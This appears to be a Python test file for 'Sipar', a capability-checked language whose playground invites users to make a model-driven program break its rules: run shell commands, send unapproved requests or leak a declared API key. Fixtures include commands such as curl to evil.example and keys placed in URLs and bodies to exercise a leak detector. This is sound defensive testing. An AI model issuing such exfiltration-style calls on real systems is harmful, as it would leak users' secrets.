        self.assertEqual((r["rc"], r["stdout"], r["verdict"]), (0, "saved notes/today.md\n",
                                                                {"state": "none", "title": "", "text": ""}))
        self.assertEqual(r["events"], [{"kind": "file", "path": "notes/today.md", "bytes": 8, "text": "# Notes\n"}])
        r = play("tour")
        self.assertEqual((r["rc"], r["stderr"], r["events"], r["verdict"]["state"]), (0, "", [], "none"))
        self.assertIn("score 9 big [4, 6] 1 6.0\n", r["stdout"])

    def test_the_folder_of_the_run_is_not_shown(self):
        r = play("apikey", billing("    // print(key)", "    print(key)"))
        self.assertTrue(r["stderr"].startswith("billing.sipar:14:10: runtime error[taint]"), r["stderr"])
        self.assertNotIn("sipar-play-", json.dumps(r))

    def test_a_run_leaves_the_process_as_it_was(self):
        folder = self.tmp()
        with mock.patch.object(tempfile, "tempdir", folder), \
                mock.patch.dict(os.environ, {"SIPAR_MODEL": "outer", "API_KEY": "outer-key", "SIPAR_DEBUG": "1"}):
            os.environ.pop("SIPAR_MOCK_SCRIPT", None)               # whatever an earlier run may have left
            before = (os.getcwd(), dict(os.environ), sys.stdin, subprocess.Popen, netio.fetch)
            self.assertEqual(play("apikey", billing("    // print(key)", "    print(key)"))["rc"], 1)
            self.assertEqual(play("email")["rc"], 0)
            self.assertEqual(play("apikey", {"billing.sipar": "fn main( {"})["rc"], 1)
            self.assertEqual((os.getcwd(), dict(os.environ), sys.stdin, subprocess.Popen, netio.fetch), before)
            self.assertNotIn("SIPAR_MOCK_SCRIPT", os.environ)       # what a run sets for itself goes with it
            self.assertEqual(os.listdir(folder), [])                # every run folder is gone

    def test_a_command_the_program_may_run_is_recorded_not_started(self):
        marker = os.path.join(self.tmp(), "started")
        program = f'allow shell ["touch"]\nfn main() uses shell {{\n    print(shell.run("touch {marker}"))\n}}\n'
        real = subprocess.Popen
        r = glue.run({"scenario": lesson(program)})
        self.assertEqual((r["rc"], r["stderr"]), (0, ""))
        self.assertEqual(r["events"], [{"kind": "shell", "cmd": ["touch", marker]}])
        self.assertEqual(r["stdout"], "(playground: the command was recorded, not run)\n\n")
        self.assertFalse(os.path.exists(marker))
        self.assertIs(subprocess.Popen, real)

    def test_the_program_reads_no_input_from_outside(self):
        program = 'allow io\nfn main() uses io {\n    let line = input("name? ")\n    print("got [{line}]")\n}\n'
        with mock.patch.object(sys, "stdin", io.StringIO("outer line\n")) as outer:
            r = glue.run({"scenario": lesson(program)})
            self.assertEqual(outer.read(), "outer line\n")          # nobody read it
        self.assertNotIn("outer line", json.dumps(r))
        self.assertEqual((r["rc"], r["stdout"]), (1, "name? "))
        self.assertTrue(r["stderr"].startswith("p.sipar:3:21: runtime error[io]: input: end of input\n"), r["stderr"])

    def test_whatever_the_run_does_the_page_gets_an_answer(self):
        cases = [(SystemExit(3), 3, ""), (SystemExit("stopped"), 1, ""), (SystemExit(), 0, ""),
                 (RuntimeError("boom"), 70, "playground: RuntimeError: boom\n"),
                 (KeyboardInterrupt(), 70, "playground: KeyboardInterrupt: \n"),
                 (RecursionError("too deep"), 70, "playground: RecursionError: too deep\n")]
        folder = self.tmp()
        for error, rc, stderr in cases:
            with self.subTest(repr(error)), mock.patch.object(tempfile, "tempdir", folder), \
                    mock.patch.object(sipar.cli, "main", side_effect=error):
                before = (os.getcwd(), dict(os.environ), sys.stdin, subprocess.Popen, netio.fetch)
                r = glue.run({"scenario": lesson("fn main() {}")})
                self.assertEqual((r["rc"], r["stderr"], r["stdout"], r["events"]), (rc, stderr, "", []))
                self.assertEqual(r["verdict"], {"state": "none", "title": "", "text": ""})
                self.assertEqual((os.getcwd(), dict(os.environ), sys.stdin, subprocess.Popen, netio.fetch), before)
                self.assertEqual(os.listdir(folder), [])

    def test_a_run_whose_folder_is_gone_still_answers(self):
        def main(argv, out, err):
            shutil.rmtree(os.getcwd())
            return 0
        here = os.getcwd()
        with mock.patch.object(sipar.cli, "main", side_effect=main):
            r = glue.run({"scenario": lesson("fn main() {}")})
        self.assertEqual((r["rc"], r["events"], r["journal"], os.getcwd()), (0, [], "", here))

    def test_the_time_of_a_run_is_in_milliseconds(self):
        clock = SimpleNamespace(monotonic=mock.Mock(side_effect=[100.0, 102.5]))
        with mock.patch.object(glue, "time", clock):
            r = glue._execute(lesson("fn main() {}"), {"p.sipar": "fn main() {}"}, {})
        self.assertEqual((r["rc"], r["ms"]), (0, 2500))

    def test_folders_of_a_scenario(self):
        program = ('allow fs.write ["./a"]\nfn main() uses fs.write {\n    fs.write("a/b/x.txt", "1")\n'
                   '    fs.write("a/y.txt", "2")\n}\n')
        r = glue.run({"scenario": lesson(program, dirs=["a/b", "a"])})        # a folder named twice is not an error
        self.assertEqual((r["rc"], r["stderr"]), (0, ""))
        self.assertEqual([(e["path"], e["text"]) for e in r["events"]], [("a/b/x.txt", "1"), ("a/y.txt", "2")])

    def test_the_key_of_the_scenario_wins_over_the_environment(self):
        with mock.patch.dict(os.environ, {"API_KEY": "outer-key-0123456789"}):
            r = play("apikey", brute("", "abcdef0123456789kmoy-"))
        self.assertIn(KEY + "\n", r["stdout"])

    def test_without_openssl(self):
        """Pyodide: the same run, with the hashlib a browser has."""
        with mock.patch.object(effects, "hashlib", NO_OPENSSL):
            r = play("apikey")
        self.assertEqual((r["rc"], r["stderr"], r["verdict"]["state"]), (0, "", "held"))
        first = json.loads(r["journal"].split("\n")[0])
        self.assertEqual(first["kind"], "env.secret")
        got = first["response"]
        self.assertEqual(got["hash"], hashlib.pbkdf2_hmac("sha256", KEY.encode(), bytes.fromhex(got["salt"]),
                                                          100_000).hex())


# ============================================================================ glue.py: the recorder

class T_Recorder(unittest.TestCase):
    WEB = [{"method": "GET", "url": "https://a.example/x", "body": "exact"},
           {"method": "GET", "url": "https://a.example/dir/", "prefix": True, "body": "under"},
           {"method": "POST", "url": "https://a.example/x", "body": "posted"},
           {"url": "https://a.example/page", "file": "page.html"},
           {"url": "https://a.example/echo", "prefix": True, "echo": True},
           {"url": "https://a.example/empty"}]

    def rec(self):
        return glue._Recorder({"web": self.WEB}, {"page.html": "<p>hi</p>"})

    def test_canned_answers(self):
        def ask(method, url):
            return self.rec()._respond({"method": method, "url": url, "headers": {"K": "v"}})
        self.assertEqual(ask("GET", "https://a.example/x"), "exact")
        self.assertEqual(ask("GET", "https://a.example/x?more"), "ok")              # not a prefix rule
        self.assertEqual(ask("GET", "https://a.example/dir/a/b"), "under")
        self.assertEqual(ask("GET", "https://a.example/dir"), "ok")
        self.assertEqual(ask("POST", "https://a.example/x"), "posted")
        self.assertEqual(ask("DELETE", "https://a.example/x"), "ok")
        self.assertEqual(ask("GET", "https://a.example/page"), "<p>hi</p>")           # GET when no method is named
        self.assertEqual(ask("POST", "https://a.example/page"), "ok")
        self.assertEqual(ask("GET", "https://a.example/empty"), "")
        self.assertEqual(json.loads(ask("GET", "https://a.example/echo?q=1")),
                         {"url": "https://a.example/echo?q=1", "headers": {"K": "v"}})
        self.assertEqual(glue._Recorder({}, {})._respond({"method": "GET", "url": "https://a.example/x"}), "ok")
        self.assertEqual(glue._Recorder({"web": [{"url": "u", "file": "gone"}]}, {})._respond(
            {"method": "GET", "url": "u"}), "")

    def test_fetch_records_the_request(self):
        rec = self.rec()
        req = urllib.request.Request("https://a.example/x", data="тело".encode(), method="POST",
                                     headers={"Authorization": "Bearer t"})
        self.assertEqual(rec.fetch(req, 5, 3), b"pos")                               # the caller's size limit
        self.assertEqual(rec.fetch(urllib.request.Request("https://a.example/x"), 5, 100), b"exact")
        self.assertEqual(rec.events, [
            {"kind": "http", "method": "POST", "url": "https://a.example/x", "body": "тело",
             "headers": {"Authorization": "Bearer t"}},
            {"kind": "http", "method": "GET", "url": "https://a.example/x", "body": "", "headers": {}}])

    def test_a_command_is_recorded_not_started(self):
        rec = self.rec()
        with mock.patch.object(subprocess, "Popen", side_effect=AssertionError("a process was started")):
            p = rec.popen(["curl", "https://evil.example"], shell=False, stdin=subprocess.DEVNULL)
            q = rec.popen(("ls", 5), stdin=subprocess.DEVNULL)
        self.assertEqual(rec.events, [{"kind": "shell", "cmd": ["curl", "https://evil.example"]},
                                      {"kind": "shell", "cmd": ["ls", "5"]}])
        self.assertEqual((p.returncode, p.poll(), p.wait(), p.args), (0, 0, 0, ["curl", "https://evil.example"]))
        out, err = p.communicate()
        self.assertEqual((out, err), (b"(playground: the command was recorded, not run)\n", b""))
        self.assertEqual((p.pid, q.pid), (glue.FAKE_PID + 1, glue.FAKE_PID + 2))
        self.assertGreater(glue.FAKE_PID, 4_194_304)        # above the largest pid Linux hands out
        self.assertIsNone(p.kill())
        self.assertIsNone(p.terminate())

    def test_a_process_with_pipes_is_refused(self):
        rec = self.rec()
        for kw in ({"stdin": subprocess.PIPE}, {}):
            with self.assertRaises(OSError):
                rec.popen(["server"], **kw)
        self.assertEqual(rec.events, [])


# ============================================================================== glue.py: the verdict

def ran(**kw):
    return {"ran": True, "stdout": "", "stderr": "", "events": [], "written": {}, "journal": "", **kw}


def http(url, method="GET", body="", headers=None):
    return {"kind": "http", "method": method, "url": url, "body": body, "headers": headers or {}}


SHELL = {"kind": "shell", "cmd": ["curl", "https://evil.example"]}
FILE = {"kind": "file", "path": "out/a.txt", "bytes": 1, "text": "x"}
NEWS = "https://news.example/today"
ANSWER = json.dumps({"kind": "agent", "response": {"text": "{}"}})
NO_ANSWER = json.dumps({"kind": "agent", "response": None, "error": {"kind": "ai", "message": "no script"}})


class T_Verdict(unittest.TestCase):
    def v(self, rule, run1, secrets=None, program="", canary=None, **scenario):
        if rule is not None:
            scenario["rule"] = rule
        return glue.verdict(scenario, run1, secrets or {}, program, canary)

    def test_no_actions(self):
        rule = {"type": "no_actions"}
        for events in ([], [http(NEWS)], [http("https://evil.example/", "POST", "x")]):     # the rule is about
            v = self.v(rule, ran(events=events))                                             # commands and files
            self.assertEqual((v["state"], v["title"]), ("held", "Held"))
        cases = [([SHELL], "1 command ran. "), ([SHELL, SHELL], "2 commands ran. "),
                 ([FILE], "1 file was written. "), ([FILE, FILE, FILE], "3 files were written. "),
                 ([FILE, SHELL, FILE], "1 command ran and 2 files were written. ")]
        for events, start in cases:
            v = self.v(rule, ran(events=events))
            self.assertEqual((v["state"], v["title"]), ("broken", "You got through"))
            self.assertTrue(v["text"].startswith(start), v["text"])
            self.assertIn(glue.REPORT, v["text"])

    def test_only_requests(self):
        rule = {"type": "only_requests", "allowed": [f"GET {NEWS}"]}
        for events, text in (([], "No request left at all."), ([http(NEWS)], "One request left: the fixed one."),
                             ([http(NEWS)] * 3, "3 requests left, all of them the fixed one.")):
            v = self.v(rule, ran(events=events))
            self.assertEqual(v["state"], "held")
            self.assertTrue(v["text"].startswith(text), v["text"])
        cases = [
            ([http("https://evil.example/")], "1 request left that should not have. "),
            ([http(NEWS + "?q=notes")], "1 request left that should not have. "),
            ([http(NEWS, "POST")], "1 request left that should not have. "),
            ([http(NEWS, body="notes")], "1 request left that should not have. "),
            ([http(NEWS), http(NEWS + "/x"), http(NEWS + "/y")], "2 requests left that should not have. "),
            ([http(NEWS), SHELL], "1 command ran. "),
            ([FILE, FILE], "2 files were written. "),
            ([http("https://evil.example/"), SHELL, FILE],
             "1 request left that should not have; 1 command ran; 1 file was written. "),
        ]
        for events, start in cases:
            v = self.v(rule, ran(events=events))
            self.assertEqual((v["state"], v["title"]), ("broken", "You got through"), events)
            self.assertTrue(v["text"].startswith(start), v["text"])
            self.assertIn(glue.REPORT, v["text"])
        self.assertEqual(self.v({"type": "only_requests"}, ran(events=[http(NEWS)]))["state"], "broken")

    def test_a_program_that_did_not_run(self):
        for kind in ("no_actions", "only_requests", "secret_stays"):
            v = self.v({"type": kind}, ran(ran=False, events=[SHELL], stdout=KEY), {"API_KEY": KEY})
            self.assertEqual((v["state"], v["title"]), ("none", "Did not run"))
        for rule in ({"type": "none"}, None):
            for run1 in (ran(ran=False), ran(events=[SHELL, FILE, http(NEWS)], stdout=KEY)):
                self.assertEqual(self.v(rule, run1, {"API_KEY": KEY}), {"state": "none", "title": "", "text": ""})

    def test_a_model_that_never_answered(self):
        for rule in ({"type": "no_actions"}, {"type": "only_requests", "allowed": [f"GET {NEWS}"]}):
            with self.subTest(rule["type"]):
                v = self.v(rule, ran(journal=NO_ANSWER + "\n"), model="model.json")
                self.assertEqual((v["state"], v["title"]), ("none", "The model said nothing"))
                self.assertTrue(v["text"].startswith("model.json could not be used"), v["text"])
                for journal in ("", ANSWER, ANSWER + "\n" + NO_ANSWER, NO_ANSWER + "\n" + ANSWER,
                                json.dumps({"kind": "fs.read", "response": None}), "not json\n[1]\n5\n"):
                    self.assertEqual(self.v(rule, ran(journal=journal))["state"], "held", journal)
                broken = self.v(rule, ran(journal=NO_ANSWER, events=[SHELL]))       # a hole stays a hole
                self.assertEqual(broken["state"], "broken")
        self.assertTrue(glue._model_silent(NO_ANSWER.replace('"agent"', '"ai"')))
        self.assertTrue(glue._model_silent("junk\n" + NO_ANSWER + "\n\n"))
        self.assertFalse(glue._model_silent(""))

    def test_secret_stays(self):
        rule, secrets, program = {"type": "secret_stays"}, {"API_KEY": KEY}, 'allow secret ["API_KEY"]\n'

        def v(run1, program=program, canary=None):
            return self.v(rule, run1, secrets, program, canary)
        never = lambda: self.fail("the second run is only for a key that seems to have leaked")   # noqa: E731

        held = v(ran(), canary=never)
        self.assertEqual((held["state"], held["title"]), ("held", "Held"))
        self.assertNotIn("header", held["text"])
        auth = {"Authorization": f"Bearer {KEY}"}
        self.assertIn("sent as a header value 1 time:", v(ran(events=[http(NEWS, headers=auth)]))["text"])
        self.assertIn("sent as a header value 2 times:", v(ran(events=[http(NEWS, headers=auth)] * 2))["text"])
        self.assertEqual(v(ran(), program="", canary=never)["state"], "held")       # nothing leaked: no complaint

        leak = ran(stdout=f"got {KEY}\n")
        out = v(leak)
        self.assertEqual((out["state"], out["title"]), ("limit", "The key got out"))
        self.assertIn("API_KEY is in the output", out["text"])
        again = v(leak, canary=lambda: ["API_KEY is in a request URL", "API_KEY is in a request URL"])
        self.assertEqual(again["state"], "limit")
        self.assertIn("API_KEY is in a request URL (checked again", again["text"])   # the second run's finding, once
        self.assertNotIn("the output", again["text"])
        own = v(leak, canary=lambda: [])
        self.assertEqual((own["state"], own["title"]), ("off", "That is your own copy"))
        for gone in ("", '// allow secret ["API_KEY"]\n', 'allow secret ["OTHER"]\n', 'allow net ["API_KEY"]\n'):
            off = v(leak, program=gone, canary=never)
            self.assertEqual((off["state"], off["title"]), ("off", "Not a secret any more"), gone)

    def test_the_words_of_every_verdict(self):
        hole = f"The program was not changed, so this is a real hole in Sipar. Please report it: {glue.REPORT}"
        said = "could not be used, so the model asked for nothing and there was nothing to stop. " \
               "The reason is in the output."
        fixed = {"type": "only_requests", "allowed": [f"GET {NEWS}"]}
        secret, program = {"type": "secret_stays"}, 'allow secret ["API_KEY"]\n'
        leak = ran(stdout=KEY)
        auth = http(NEWS, headers={"Authorization": f"Bearer {KEY}"})
        held = "The key's value is not in the output, in a file, in the journal or in a URL."
        cases = [
            (self.v({"type": "no_actions"}, ran()),
             "No command ran and no file was written. "
             "Whatever the model asked for, it did not reach the shell or the disk."),
            (self.v({"type": "no_actions"}, ran(events=[SHELL])), f"1 command ran. {hole}"),
            (self.v({"type": "no_actions"}, ran(ran=False)), "Nothing ran: see the error in the output."),
            (self.v({"type": "no_actions"}, ran(journal=NO_ANSWER), model="model.json"), f"model.json {said}"),
            (self.v({"type": "no_actions"}, ran(journal=NO_ANSWER)), f"The model script {said}"),
            (self.v(fixed, ran(events=[http(NEWS)])),
             "One request left: the fixed one. Nothing the model wrote became part of a URL or a body."),
            (self.v(fixed, ran(events=[http(NEWS + "?q")])), f"1 request left that should not have. {hole}"),
            (self.v(secret, ran(), {"API_KEY": KEY}, program), held),
            (self.v(secret, ran(events=[auth]), {"API_KEY": KEY}, program),
             f"{held} It was sent as a header value 1 time: the one place it may go."),
            (self.v(secret, leak, {"API_KEY": KEY}, ""),
             'The program no longer says allow secret ["API_KEY"], so the key is ordinary data. '
             "Put the line back: the game is to leak a value that was declared secret."),
            (self.v(secret, leak, {"API_KEY": KEY}, program, lambda: []),
             "The key in the result was typed into the program, it did not come from env.secret(): "
             "the same program run with a different key does not show that key. "
             "The game is to get the value out of the variable."),
            (self.v(secret, leak, {"API_KEY": KEY}, program, lambda: ["API_KEY is in the output"]),
             "API_KEY is in the output (checked again with a second, random key). "
             "If you rebuilt it piece by piece with `if` on the key, that is the documented limit: "
             f"choices made from a secret are not tracked ({glue.LIMIT}). "
             f"Any other way is a real hole in Sipar. Please report it: {glue.REPORT}"),
        ]
        for n, (v, text) in enumerate(cases):
            self.assertEqual(v["text"], text, n)
        self.assertEqual((glue.REPORT, glue.LIMIT),
                         ("https://github.com/osimmoapies/sipar/security/advisories/new",
                          "https://github.com/osimmoapies/sipar/blob/main/SECURITY.md"))

    def test_where_a_secret_counts_as_leaked(self):
        secrets = {"API_KEY": KEY}

        def leaks(stdout="", stderr="", events=(), written=None):
            return glue._leaks(secrets, stdout, stderr, list(events), written or {})
        cases = [
            ("the output", {"stdout": f"x{KEY}y"}),
            ("the error output", {"stderr": KEY}),
            ("the file out/k.txt", {"written": {"out/k.txt": b"k=" + KEY.encode()}}),
            ("the journal", {"written": {".sipar/runs/a.jsonl": KEY.encode()}}),
            ("a request URL", {"events": [http(f"https://x.example/?k={KEY}")]}),
            ("a request body", {"events": [http("https://x.example/", "POST", KEY)]}),
            ("a header name", {"events": [http("https://x.example/", headers={KEY: "v"})]}),
            ("a command", {"events": [{"kind": "shell", "cmd": ["echo", f"k={KEY}"]}]}),
        ]
        for where, kw in cases:
            self.assertEqual(leaks(**kw), [f"API_KEY is in {where}"])
        self.assertEqual(leaks(), [])
        self.assertEqual(leaks(events=[http("https://x.example/", headers={"Authorization": f"Bearer {KEY}"})]), [])
        self.assertEqual(leaks(stdout=KEY[:-1], stderr=KEY[1:], events=[FILE, SHELL]), [])      # not the whole key
        self.assertEqual(leaks(stdout=KEY, stderr=KEY), ["API_KEY is in the output", "API_KEY is in the error output"])
        two = glue._leaks({"A": "first-secret", "B": "second-secret"}, "second-secret", "", [], {})
        self.assertEqual(two, ["B is in the output"])

    def test_what_the_page_gets_has_no_key(self):
        secrets = {"API_KEY": KEY}
        self.assertEqual(glue._public({"kind": "shell", "cmd": ["echo", f"k={KEY}"]}, secrets),
                         {"kind": "shell", "cmd": ["echo", "k=‹API_KEY›"]})
        self.assertEqual(glue._public(http(f"https://x.example/{KEY}", "POST", f"b {KEY}", {f"H{KEY}": f"v {KEY}"}),
                                      secrets),
                         {"kind": "http", "method": "POST", "url": "https://x.example/‹API_KEY›",
                          "body": "b ‹API_KEY›", "headers": {"H‹API_KEY›": "v ‹API_KEY›"}})
        self.assertEqual(glue._public({"kind": "file", "path": f"out/{KEY}.txt", "bytes": 30, "text": f"k={KEY}"},
                                      secrets),
                         {"kind": "file", "path": "out/‹API_KEY›.txt", "bytes": 30, "text": "k=‹API_KEY›"})
        long = glue._public({"kind": "file", "path": "a", "bytes": 5000, "text": "x" * 5000}, {})["text"]
        self.assertEqual(long, "x" * 2000 + "\n… (3000 more characters)")
        for n, shown in ((2000, "x" * 2000), (2001, "x" * 2000 + "\n… (1 more characters)")):
            self.assertEqual(glue._public(http("https://x.example/", "POST", "x" * n), {})["body"], shown)
            self.assertEqual(glue._public({"kind": "file", "path": "a", "bytes": n, "text": "x" * n}, {})["text"], shown)
        self.assertEqual(glue._hide(f"{KEY} and {KEY}", secrets), "‹API_KEY› and ‹API_KEY›")

    def test_small_parts(self):
        self.assertEqual(glue._clip("abc", 3), "abc")
        self.assertEqual(glue._clip("abcd", 3), "abc\n… (1 more characters)")
        self.assertEqual(glue._clip("x" * glue.MAX_TEXT), "x" * glue.MAX_TEXT)
        self.assertEqual((glue._count(1, "a", "b"), glue._count(0, "a", "b"), glue._count(2, "a", "b")),
                         ("1 a", "0 b", "2 b"))
        yes = ['allow secret ["API_KEY"]', '  allow  secret ["OTHER", "API_KEY"]', 'x\nallow secret ["API_KEY"] // why']
        no = ["", '// allow secret ["API_KEY"]', 'allow secret ["API_KEY2"]', 'allow secret [API_KEY]',
              'allow net ["API_KEY"]', 'let s = "allow secret [\\"API_KEY\\"]"']
        for program in yes:
            self.assertIs(glue._declared_secret(program, "API_KEY"), True, program)
        for program in no:
            self.assertIs(glue._declared_secret(program, "API_KEY"), False, program)


class T_OtherKey(unittest.TestCase):
    """The key of the second run: a program that reads the key gets this one, a key that was typed stays typed."""

    def test_same_shape_as_the_demo_key(self):
        seen = set()
        for _ in range(300):
            k = glue.other_key(KEY)
            seen.add(k)
            self.assertEqual(len(k), len(KEY))
            self.assertEqual(k[:9], "demo-key-")
            self.assertNotEqual(k, KEY)
            self.assertLessEqual(set(k[9:]), set(KEY[9:]))
        self.assertGreater(len(seen), 290)

    def test_other_shapes(self):
        for value, head in (("abcd1234efgh", ""), ("sk_live_abc", ""), ("tok:0123456789abcdef", "tok:"),
                            ("a-b-c-d-e-f-g-h-", ""),
                            ("sk-abcdabcd", "sk-"), ("abcdabcd", "")):       # the least that counts: 8 long, 4 kinds
            with self.subTest(value):
                for _ in range(50):
                    k = glue.other_key(value)
                    self.assertEqual(len(k), len(value))
                    self.assertTrue(k.startswith(head))
                    self.assertNotEqual(k, value)
                    self.assertLessEqual(set(k), set(value))

    def test_a_key_too_plain_to_copy(self):
        for value in ("", "abc", "aaaaaaaaaaaa", "ab-ab-ab", "abc-abc", "1234567"):
            with self.subTest(value):
                k = glue.other_key(value)
                self.assertRegex(k, r"\Acanary-[0-9a-f]{16}\Z")
                self.assertNotEqual(k, glue.other_key(value))

    def test_never_the_key_itself(self):
        tail = KEY[9:]
        chars = sorted(set(tail))
        same = bytes(chars.index(c) for c in tail)
        with mock.patch.object(os, "urandom", side_effect=[same, bytes(len(tail))]) as rnd:
            k = glue.other_key(KEY)
        self.assertEqual(k, "demo-key-" + chars[0] * len(tail))
        self.assertEqual(rnd.call_count, 2)


class T_Cli(Tmp):
    def test_payload_on_stdin(self):
        d = self.tmp()
        p = subprocess.run([sys.executable, os.path.join(ROOT, "playground", "glue.py")],
                           input=json.dumps({"scenario": SCENARIOS["apikey"], "edits": {}}), cwd=d, timeout=120,
                           capture_output=True, encoding="utf-8", env={**os.environ, "PYTHONIOENCODING": "utf-8"})
        self.assertEqual((p.returncode, p.stderr), (0, ""))
        self.assertEqual(os.listdir(d), [])
        r = json.loads(p.stdout)
        self.assertEqual((r["rc"], r["verdict"]["state"]), (0, "held"))
        self.assertIn("Bearer ‹API_KEY›", p.stdout)
        self.assertNotIn(KEY, p.stdout)


# ===================================================================== sipar/runtime/effects.py: PBKDF2

class T_Pbkdf2(unittest.TestCase):
    """Python in a browser (Pyodide) is built without OpenSSL: hashlib has no pbkdf2_hmac there. The interpreter
    then uses its own, which must give the same bytes: a journal recorded on a laptop is replayed in a browser."""

    VECTORS = [     # PBKDF2-HMAC-SHA256, 32 bytes
        (b"password", b"salt", 1, "120fb6cffcf8b32c43e7225256c4f837a86548c92ccc35480805987cb70be17b"),
        (b"password", b"salt", 2, "ae4d0c95af6b46d32d0adff928f06dd02a303f8ef3c251dfd6e2d85a95474c43"),
        (b"password", b"salt", 4096, "c5e478d59288c841aa530db6845c4c8d962893a001ce4e11a4963873aa98134a"),
    ]

    def test_known_answers(self):
        for password, salt, rounds, want in self.VECTORS:
            self.assertEqual(effects.pbkdf2_sha256(password, salt, rounds).hex(), want)
            self.assertEqual(hashlib.pbkdf2_hmac("sha256", password, salt, rounds).hex(), want)

    def test_same_bytes_as_hashlib(self):
        cases = [(b"", b"", 1), (b"", b"salt", 3), (b"p", b"", 2), (b"k" * 63, b"s", 2), (b"k" * 64, b"s", 2),
                 (b"k" * 65, b"s", 2), (b"k" * 200, b"s" * 100, 5), ("пароль".encode(), bytes(range(256)), 7),
                 (b"\x00\xff" * 40, b"\x00", 1), (b"\x36" * 64, b"\x5c" * 64, 3), (b"password", b"salt", 1000)]
        for password, salt, rounds in cases:
            with self.subTest(password=password[:8], rounds=rounds):
                got = effects.pbkdf2_sha256(password, salt, rounds)
                self.assertEqual(len(got), 32)
                self.assertEqual(got, hashlib.pbkdf2_hmac("sha256", password, salt, rounds))

    def test_secret_hash_is_the_same_with_and_without_openssl(self):
        self.assertEqual(effects.SECRET_HASH_ROUNDS, 100_000)
        self.assertFalse(hasattr(NO_OPENSSL, "pbkdf2_hmac"))
        for value, salt in ((KEY, "48f51fe6b992da16f4cb2f48ed08cfc3"), ("ключ-ß-鍵", "00" * 16), ("", "ff" * 16)):
            with self.subTest(value):
                want = hashlib.pbkdf2_hmac("sha256", value.encode("utf-8"), bytes.fromhex(salt), 100_000).hex()
                self.assertEqual(effects.secret_hash(value, salt), want)
                with mock.patch.object(effects, "hashlib", NO_OPENSSL):
                    self.assertEqual(effects.secret_hash(value, salt), want)
        for hashes in (hashlib, NO_OPENSSL):                    # a salt that is not hex: the same error both ways
            with mock.patch.object(effects, "hashlib", hashes), self.assertRaises(ValueError):
                effects.secret_hash(KEY, "not hex")

    def test_a_journal_replays_across(self):
        """Recorded with OpenSSL, replayed without, and the other way round; a different key is still caught."""
        p = Prog(main_src('let k = env.secret("API_KEY")\nif k.len() > 18 { print("long") } else { print("short") }',
                          'allow secret ["API_KEY"]'))
        self.addCleanup(p.cleanup)
        for first, second in ((hashlib, NO_OPENSSL), (NO_OPENSSL, hashlib), (NO_OPENSSL, NO_OPENSSL)):
            with self.subTest(recorded_without_openssl=first is NO_OPENSSL):
                journal = Journal()
                with mock.patch.object(effects, "hashlib", first):
                    self.assertEqual(p.run(journal=journal, env={"API_KEY": KEY}), "long\n")
                entries = json.dumps(journal.entries)
                self.assertNotIn(KEY, entries)
                with mock.patch.object(effects, "hashlib", second):
                    self.assertEqual(p.run(journal=Journal(replay=json.loads(entries)), env={"API_KEY": KEY}),
                                     "long\n")
                    with self.assertRaises(SiparRuntimeError) as cm:
                        p.run(journal=Journal(replay=json.loads(entries)), env={"API_KEY": KEY[:-1] + "0"})
                self.assertEqual(cm.exception.kind, "replay")


class T_Shipped(unittest.TestCase):
    def test_the_source_archive_carries_the_playground(self):
        """These tests read playground/ and tools/: an sdist without them could not run its own tests."""
        with open(os.path.join(ROOT, "pyproject.toml"), "rb") as f:
            include = tomllib.load(f)["tool"]["hatch"]["build"]["targets"]["sdist"]["include"]
        for path in ("/playground", "/tools", "/tests", "/examples"):
            self.assertIn(path, include)

    def test_nothing_generated_is_kept_in_the_repository(self):
        kept = set(os.listdir(os.path.join(ROOT, "playground"))) - {"__pycache__"}
        self.assertEqual(kept, {*site.STATIC, "scenarios"})
        self.assertIn("_site/", read(".gitignore").split("\n"))    # where CONTRIBUTING.md and the workflow build
        self.assertIn("--out _site ", read("CONTRIBUTING.md"))
        self.assertIn("--out _site ", read(".github", "workflows", "pages.yml"))

    def test_the_new_issue_page_sends_a_hole_to_the_private_form(self):
        """A hole must not be reported in public: the new-issue page links the form the verdict links."""
        config = read(".github", "ISSUE_TEMPLATE", "config.yml")
        self.assertIn(f"    url: {glue.REPORT}\n", config)
        self.assertIn(f"    url: {PAGE}\n", config)
        self.assertIn("SECURITY.md", read(".github", "ISSUE_TEMPLATE", "bug_report.yml"))
        for form in ("bug_report.yml", "idea.yml"):
            text = read(".github", "ISSUE_TEMPLATE", form)
            for key in ("name: ", "description: ", "body:\n"):         # what GitHub needs to show a form
                self.assertEqual(len(re.findall("^" + re.escape(key), text, re.M)), 1, (form, key))
            self.assertNotIn("\t", text)
        asked = re.findall(r"`python3 (tools/\w+\.py)`", read(".github", "PULL_REQUEST_TEMPLATE.md"))
        self.assertEqual(asked, ["tools/ptest.py"])
        self.assertTrue(os.path.isfile(os.path.join(ROOT, *asked[0].split("/"))))


if __name__ == "__main__":
    unittest.main()
